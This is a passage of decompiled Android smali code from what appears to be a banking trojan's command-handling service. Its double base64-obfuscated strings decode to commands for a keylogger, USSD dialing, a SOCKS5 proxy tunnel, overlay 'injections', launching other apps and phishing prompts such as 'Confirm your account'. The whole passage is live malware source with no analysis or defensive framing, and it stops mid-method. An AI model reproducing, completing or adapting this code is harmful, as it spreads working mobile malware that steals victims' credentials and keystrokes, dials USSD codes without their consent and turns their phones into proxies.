    const-string v12, "UTI5dVptbHliV1Y2SUhadmRISmxJR052YlhCMFpRPT0="

    goto/16 :goto_c7a

    :cond_d16
    const-string v12, "VlVFPQ=="

    invoke-static {v12}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v12

    invoke-static {v12}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v12

    invoke-virtual {v11, v12}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v11

    if-eqz v11, :cond_d34

    const-string v11, "MEtMUXRkR0EwTHpSbHRDOTBMN1FzdEMxSU5DLzBMN1FzdEdXMExUUXZ0QzgwTHZRdGRDOTBMM1JqeUU9"

    invoke-static {v11}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v11

    invoke-static {v11}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v11

    const-string v12, "MEovUmx0QzAwWUxRc3RDMTBZRFF0TkdNMFlMUXRTRFJnZEN5MFpiUXVTRFJnTkN3MFlYUmc5QzkwTDdRdWc9PQ=="

    goto/16 :goto_c7a

    :cond_d34
    const-string v11, "VlhKblpXNTBJRzFsYzNOaFoyVWg="

    invoke-static {v11}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v11

    invoke-static {v11}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v11

    const-string v12, "UTI5dVptbHliU0I1YjNWeUlHRmpZMjkxYm5RPQ=="

    goto/16 :goto_c7a

    :goto_d42
    new-instance v13, Landroid/content/Intent;

    const-class v14, Lnaqsl/ebxcb/exu/ServiceModuleNotification;

    invoke-direct {v13, v0, v14}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    const-string v14, "WVhCd2JtRnRaUT09"

    invoke-static {v14}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v14

    invoke-static {v14}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v14

    invoke-virtual {v13, v14, v5}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    move-result-object v5

    const-string v13, "ZEdsMGJHVT0="

    invoke-static {v13}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v13

    invoke-static {v13}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v13

    invoke-virtual {v5, v13, v11}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    move-result-object v5

    const-string v11, "ZEdWNGRBPT0="

    invoke-static {v11}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v11

    invoke-static {v11}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v11

    invoke-virtual {v5, v11, v12}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    move-result-object v5

    invoke-virtual {v0, v5}, Landroid/app/IntentService;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;
    :try_end_d76
    .catch Ljava/lang/Exception; {:try_start_c34 .. :try_end_d76} :catch_d76

    :catch_d76
    :cond_d76
    aget-object v5, v2, v3

    const-string v11, "VW1WeGRXVnpkRkJsY20xcGMzTnBiMjVKYm1vPQ=="

    invoke-static {v11}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v11

    invoke-static {v11}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v11

    invoke-virtual {v5, v11}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    aget-object v5, v2, v3

    const-string v11, "VW1WeGRXVnpkRkJsY20xcGMzTnBiMjVIVUZNPQ=="

    invoke-static {v11}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v11

    invoke-static {v11}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v11

    invoke-virtual {v5, v11}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v5

    if-eqz v5, :cond_dc9

    iget-object v5, v0, Lnaqsl/ebxcb/exu/ServiceCommands;->ifdf:Lnaqsl/ebxcb/exu/int;

    iget-object v11, v0, Lnaqsl/ebxcb/exu/ServiceCommands;->new:Landroid/content/Context;

    invoke-virtual {v5, v11}, Lnaqsl/ebxcb/exu/int;->byte(Landroid/content/Context;)Z

    move-result v5

    if-nez v5, :cond_dc9

    new-instance v5, Landroid/content/Intent;

    const-class v11, Lnaqsl/ebxcb/exu/Activity/ActivityAlert2;

    invoke-direct {v5, v0, v11}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    const-string v11, "YzNSaGNuUT0="

    invoke-static {v11}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v11

    invoke-static {v11}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v11

    const-string v12, "WjNCeg=="

    invoke-static {v12}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v12

    invoke-static {v12}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v12

    invoke-virtual {v5, v11, v12}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    move-result-object v5

    invoke-virtual {v5, v10}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    invoke-virtual {v5, v9}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    invoke-virtual {v0, v5}, Landroid/app/IntentService;->startActivity(Landroid/content/Intent;)V

    :cond_dc9
    aget-object v5, v2, v3

    const-string v11, "ZkhWemMyUTk="

    invoke-static {v11}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v11

    invoke-static {v11}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v11

    invoke-virtual {v5, v11}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v5

    if-eqz v5, :cond_e15

    :try_start_ddb
    iget-object v5, v0, Lnaqsl/ebxcb/exu/ServiceCommands;->ifdf:Lnaqsl/ebxcb/exu/int;

    aget-object v11, v2, v3

    const-string v12, "ZkhWemMyUTk="

    invoke-static {v12}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v12

    invoke-static {v12}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v12

    const-string v13, "ZkdWdVpGVnpjMFE9"

    invoke-static {v13}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v13

    invoke-static {v13}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v13

    invoke-virtual {v5, v11, v12, v13}, Lnaqsl/ebxcb/exu/int;->fddo(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    new-instance v11, Landroid/content/Intent;

    const-class v12, Lnaqsl/ebxcb/exu/Activity/ActivityStartUSSD;

    invoke-direct {v11, v0, v12}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-static {v6}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    invoke-static {v6}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v11, v6, v5}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    move-result-object v5

    invoke-virtual {v5, v10}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    invoke-virtual {v5, v9}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    invoke-virtual {v0, v5}, Landroid/app/IntentService;->startActivity(Landroid/content/Intent;)V
    :try_end_e13
    .catch Ljava/lang/Exception; {:try_start_ddb .. :try_end_e13} :catch_e14

    goto :goto_e15

    :catch_e14
    nop

    :cond_e15
    :goto_e15
    aget-object v5, v2, v3

    const-string v6, "ZkhOdlkydHphRzl6ZEQwPQ=="

    invoke-static {v6}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    invoke-static {v6}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v5, v6}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v5

    if-eqz v5, :cond_f17

    :try_start_e27
    iget-object v5, v0, Lnaqsl/ebxcb/exu/ServiceCommands;->ifdf:Lnaqsl/ebxcb/exu/int;

    aget-object v6, v2, v3

    const-string v11, "ZkhOdlkydHphRzl6ZEQwPQ=="

    invoke-static {v11}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v11

    invoke-static {v11}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v11

    const-string v12, "ZkhWelpYSTk="

    invoke-static {v12}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v12

    invoke-static {v12}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v12

    invoke-virtual {v5, v6, v11, v12}, Lnaqsl/ebxcb/exu/int;->fddo(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    iget-object v6, v0, Lnaqsl/ebxcb/exu/ServiceCommands;->ifdf:Lnaqsl/ebxcb/exu/int;

    aget-object v11, v2, v3

    const-string v12, "ZkhWelpYSTk="

    invoke-static {v12}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v12

    invoke-static {v12}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v12

    const-string v13, "ZkhCaGMzTTk="

    invoke-static {v13}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v13

    invoke-static {v13}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v13

    invoke-virtual {v6, v11, v12, v13}, Lnaqsl/ebxcb/exu/int;->fddo(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    iget-object v11, v0, Lnaqsl/ebxcb/exu/ServiceCommands;->ifdf:Lnaqsl/ebxcb/exu/int;

    aget-object v12, v2, v3

    const-string v13, "ZkhCaGMzTTk="

    invoke-static {v13}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v13

    invoke-static {v13}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v13

    const-string v14, "ZkhCdmNuUTk="

    invoke-static {v14}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v14

    invoke-static {v14}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v14

    invoke-virtual {v11, v12, v13, v14}, Lnaqsl/ebxcb/exu/int;->fddo(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v11

    iget-object v12, v0, Lnaqsl/ebxcb/exu/ServiceCommands;->ifdf:Lnaqsl/ebxcb/exu/int;

    aget-object v13, v2, v3

    const-string v14, "ZkhCdmNuUTk="

    invoke-static {v14}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v14

    invoke-static {v14}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v14

    const-string v15, "ZkdWdVpITnphQT09"

    invoke-static {v15}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v15

    invoke-static {v15}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v15

    invoke-virtual {v12, v13, v14, v15}, Lnaqsl/ebxcb/exu/int;->fddo(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v12

    new-instance v13, Landroid/content/Intent;

    const-class v14, Lnaqsl/ebxcb/exu/socks/ServiceForwardingTunel;

    invoke-direct {v13, v0, v14}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    const-string v14, "YUc5emRBPT0="

    invoke-static {v14}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v14

    invoke-static {v14}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v14

    new-instance v15, Ljava/lang/StringBuilder;

    invoke-direct {v15}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v15, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v15, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v15}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v13, v14, v5}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    move-result-object v5

    const-string v13, "ZFhObGNnPT0="

    invoke-static {v13}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v13

    invoke-static {v13}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v13

    new-instance v14, Ljava/lang/StringBuilder;

    invoke-direct {v14}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v14, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v14, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v14}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v5, v13, v6}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    move-result-object v5

    const-string v6, "Y0dGemN3PT0="

    invoke-static {v6}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    invoke-static {v6}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    new-instance v13, Ljava/lang/StringBuilder;

    invoke-direct {v13}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v13, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v13, v11}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v13}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v11

    invoke-virtual {v5, v6, v11}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    move-result-object v5

    const-string v6, "Y0c5eWRBPT0="

    invoke-static {v6}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    invoke-static {v6}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    new-instance v11, Ljava/lang/StringBuilder;

    invoke-direct {v11}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v11, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v11, v12}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v11}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v11

    invoke-virtual {v5, v6, v11}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    move-result-object v5

    invoke-virtual {v0, v5}, Landroid/app/IntentService;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;
    :try_end_f15
    .catch Ljava/lang/Exception; {:try_start_e27 .. :try_end_f15} :catch_f16

    goto :goto_f17

    :catch_f16
    nop

    :cond_f17
    :goto_f17
    aget-object v5, v2, v3

    const-string v6, "YzNSdmNITnZZMnR6TlE9PQ=="

    invoke-static {v6}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    invoke-static {v6}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v5, v6}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v5

    if-eqz v5, :cond_f40

    :try_start_f29
    iget-object v5, v0, Lnaqsl/ebxcb/exu/ServiceCommands;->ifdf:Lnaqsl/ebxcb/exu/int;

    const-string v6, "YzI5amEzTT0="

    invoke-static {v6}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    invoke-static {v6}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    const-string v11, "c3RvcA=="

    invoke-static {v11}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v11

    invoke-virtual {v5, v0, v6, v11}, Lnaqsl/ebxcb/exu/int;->ifdf(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V
    :try_end_f3e
    .catch Ljava/lang/Exception; {:try_start_f29 .. :try_end_f3e} :catch_f3f

    goto :goto_f40

    :catch_f3f
    nop

    :cond_f40
    :goto_f40
    aget-object v5, v2, v3

    const-string v6, "ZkhKbGNHeGhZMlYxY213OQ=="

    invoke-static {v6}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    invoke-static {v6}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v5, v6}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v5

    if-eqz v5, :cond_f8e

    :try_start_f52
    iget-object v5, v0, Lnaqsl/ebxcb/exu/ServiceCommands;->ifdf:Lnaqsl/ebxcb/exu/int;

    aget-object v6, v2, v3

    const-string v11, "ZkhKbGNHeGhZMlYxY213OQ=="

    invoke-static {v11}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v11

    invoke-static {v11}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v11

    const-string v12, "ZkdWdVpIVnliQT09"

    invoke-static {v12}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v12

    invoke-static {v12}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v12

    invoke-virtual {v5, v6, v11, v12}, Lnaqsl/ebxcb/exu/int;->fddo(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    iget-object v6, v0, Lnaqsl/ebxcb/exu/ServiceCommands;->ifdf:Lnaqsl/ebxcb/exu/int;

    const-string v11, "ZFhKcw=="

    invoke-static {v11}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v11

    invoke-static {v11}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v11

    invoke-virtual {v6, v0, v11, v5}, Lnaqsl/ebxcb/exu/int;->ifdf(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    iget-object v6, v0, Lnaqsl/ebxcb/exu/ServiceCommands;->ifdf:Lnaqsl/ebxcb/exu/int;

    const-string v11, "ZFhKc2N3PT0="

    invoke-static {v11}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v11

    invoke-static {v11}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v11

    invoke-virtual {v6, v0, v11, v5}, Lnaqsl/ebxcb/exu/int;->ifdf(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V
    :try_end_f8c
    .catch Ljava/lang/Exception; {:try_start_f52 .. :try_end_f8c} :catch_f8d

    goto :goto_f8e

    :catch_f8d
    nop

    :cond_f8e
    :goto_f8e
    aget-object v5, v2, v3

    const-string v6, "ZkhOMFlYSjBZWEJ3YkdsallYUnBiMjQ5"

    invoke-static {v6}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    invoke-static {v6}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v5, v6}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v5

    if-eqz v5, :cond_fc9

    :try_start_fa0
    iget-object v5, v0, Lnaqsl/ebxcb/exu/ServiceCommands;->ifdf:Lnaqsl/ebxcb/exu/int;

    aget-object v6, v2, v3

    const-string v11, "ZkhOMFlYSjBZWEJ3YkdsallYUnBiMjQ5"

    invoke-static {v11}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v11

    invoke-static {v11}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v11

    const-string v12, "ZkdWdVpHRndjQT09"

    invoke-static {v12}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v12

    invoke-static {v12}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v12

    invoke-virtual {v5, v6, v11, v12}, Lnaqsl/ebxcb/exu/int;->fddo(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    invoke-virtual/range {p0 .. p0}, Landroid/app/IntentService;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v6

    invoke-virtual {v6, v5}, Landroid/content/pm/PackageManager;->getLaunchIntentForPackage(Ljava/lang/String;)Landroid/content/Intent;

    move-result-object v5

    invoke-virtual {v0, v5}, Landroid/app/IntentService;->startActivity(Landroid/content/Intent;)V
    :try_end_fc7
    .catch Ljava/lang/Exception; {:try_start_fa0 .. :try_end_fc7} :catch_fc8

    goto :goto_fc9

    :catch_fc8
    nop

    :cond_fc9
    :goto_fc9
    aget-object v5, v2, v3

    const-string v6, "YTJsc2JFSnZkQT09"

    invoke-static {v6}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    invoke-static {v6}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v5, v6}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v5

    if-eqz v5, :cond_1014

    :try_start_fdb
    iget-object v5, v0, Lnaqsl/ebxcb/exu/ServiceCommands;->ifdf:Lnaqsl/ebxcb/exu/int;

    const-string v6, "ZFhKcw=="

    invoke-static {v6}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    invoke-static {v6}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v5, v0, v6, v7}, Lnaqsl/ebxcb/exu/int;->ifdf(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    iget-object v5, v0, Lnaqsl/ebxcb/exu/ServiceCommands;->ifdf:Lnaqsl/ebxcb/exu/int;

    const-string v6, "ZFhKc2N3PT0="

    invoke-static {v6}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    invoke-static {v6}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v5, v0, v6, v7}, Lnaqsl/ebxcb/exu/int;->ifdf(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    iget-object v5, v0, Lnaqsl/ebxcb/exu/ServiceCommands;->ifdf:Lnaqsl/ebxcb/exu/int;

    const-string v6, "ZFhKc1NXNXE="

    invoke-static {v6}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    invoke-static {v6}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v5, v0, v6, v7}, Lnaqsl/ebxcb/exu/int;->ifdf(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    new-instance v5, Landroid/content/Intent;

    const-class v6, Lnaqsl/ebxcb/exu/ServiceInjections;

    invoke-direct {v5, v0, v6}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {v0, v5}, Landroid/app/IntentService;->stopService(Landroid/content/Intent;)Z
    :try_end_1012
    .catch Ljava/lang/Exception; {:try_start_fdb .. :try_end_1012} :catch_1013

    goto :goto_1014

    :catch_1013
    nop

    :cond_1014
    :goto_1014
    aget-object v5, v2, v3

    const-string v6, "WjJWMGEyVjViRzluWjJWeQ=="

    invoke-static {v6}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    invoke-static {v6}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v5, v6}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v5

    if-eqz v5, :cond_10c0

    :try_start_1026
    const-string v5, "YTJWNWN5NXNiMmM9"

    invoke-static {v5}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    invoke-static {v5}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v0, v5}, Lnaqsl/ebxcb/exu/ServiceCommands;->ifdf(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    const-string v6, "ZkY1OA=="

    invoke-static {v6}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    invoke-static {v6}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    const-string v11, "WEc0PQ=="

    invoke-static {v11}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v11

    invoke-static {v11}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v11

    invoke-virtual {v5, v6, v11}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v5

    iget-object v6, v0, Lnaqsl/ebxcb/exu/ServiceCommands;->ifdf:Lnaqsl/ebxcb/exu/int;

    const-string v11, "TVRJPQ=="

    invoke-static {v11}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v11

    invoke-static {v11}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v11

    new-instance v12, Ljava/lang/StringBuilder;

    invoke-direct {v12}, Ljava/lang/StringBuilder;-><init>()V

    invoke-static {v8}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v13

    invoke-static {v13}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v13

    invoke-virtual {v12, v13}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget-object v13, v0, Lnaqsl/ebxcb/exu/ServiceCommands;->ifdf:Lnaqsl/ebxcb/exu/int;

    new-instance v14, Ljava/lang/StringBuilder;

    invoke-direct {v14}, Ljava/lang/StringBuilder;-><init>()V

    iget-object v15, v0, Lnaqsl/ebxcb/exu/ServiceCommands;->ifdf:Lnaqsl/ebxcb/exu/int;

    invoke-virtual {v15, v0}, Lnaqsl/ebxcb/exu/int;->fddo(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v15

    invoke-virtual {v14, v15}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v15, "Zm41K2ZuNStmbjUrZmc9PQ=="

    invoke-static {v15}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v15

    invoke-static {v15}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

